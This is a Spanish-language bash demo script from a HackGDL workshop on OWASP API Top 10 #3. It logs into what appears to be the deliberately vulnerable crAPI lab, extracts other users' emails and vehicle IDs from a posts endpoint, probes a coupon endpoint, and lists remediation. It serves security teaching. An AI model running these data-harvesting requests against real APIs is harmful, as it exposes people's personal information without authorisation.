#!/bin/bash
# ============================================================
# DEMO SCRIPT 04 — Exposición Excesiva de Datos
# HackGDL: Exploit the Invisible
# OWASP API Security Top 10: #3 — Broken Object Property Level Authorization
# ============================================================

TARGET="${1:-http://crapi-web}"
ATTACKER_EMAIL="${2:-attacker@test.com}"
ATTACKER_PASS="${3:-Password1@}"

echo "=============================================="
echo " FASE 4: EXPOSICIÓN EXCESIVA DE DATOS"
echo " Target: $TARGET"
echo " OWASP API Top 10 #3: Broken Object Property Level Auth"
echo "=============================================="
echo ""

# ── Autenticar ────────────────────────────────────────────────
TOKEN=$(curl -s -X POST "${TARGET}/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${ATTACKER_EMAIL}\",\"password\":\"${ATTACKER_PASS}\"}" | jq -r '.token' 2>/dev/null)

if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then
  echo "[!] Error al autenticar. Ejecutar primero 02-exploit-bola.sh"
  exit 1
fi
echo "[✓] Autenticado."
echo ""

# ── 4.1 Posts del community con datos internos filtrados ─────
echo "[*] Analizando respuesta del endpoint /community/posts/recent..."
echo ""
POSTS=$(curl -s "${TARGET}/community/api/v2/community/posts/recent" \
  -H "Authorization: Bearer $TOKEN")

echo "[*] Campos expuestos en respuesta (no deberían estar ahí):"
echo ""
echo "$POSTS" | jq '.posts[0:3][] | {
  titulo: .title,
  DATOS_INTERNOS: {
    email_autor: .author.email,
    vehicle_id: .author.vehicleid
  }
}' 2>/dev/null

echo ""
echo "----------------------------------------------"
echo "[!] El API filtra: email, número de teléfono, vehicle IDs"
echo "[!] Estos campos no deberían estar en una respuesta pública"
echo "----------------------------------------------"
echo ""

# ── 4.2 Video API — coupon leak ──────────────────────────────
echo "[*] Probando endpoint de cupones de descuento..."
echo ""
COUPON_RESPONSE=$(curl -s "${TARGET}/community/api/v2/coupon/validate-coupon" \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":"TRAC075"}')

echo "[*] Respuesta del cupón:"
echo "$COUPON_RESPONSE" | jq '.' 2>/dev/null || echo "$COUPON_RESPONSE"
echo ""

# ── 4.3 Resumen de datos comprometidos ──────────────────────
echo "----------------------------------------------"
echo "[!] RESUMEN DE DATOS EXPUESTOS:"
echo ""
echo "  Desde posts públicos (sin autenticación especial):"
echo "$POSTS" | jq -r '.posts[0:5][] | "  • \(.author.email) — vehicleId: \(.author.vehicleid)"' 2>/dev/null
echo ""
echo "  Tipo de datos: PII (Personally Identifiable Information)"
echo "  Impacto: GDPR, LFPDPPP (México) violations"
echo "  Remediación: Response filtering, DTO pattern"
echo "----------------------------------------------"
echo ""
echo "[✓] Siguiente: ./05-dark-api-fail.sh (los mismos ataques vs Dark API)"
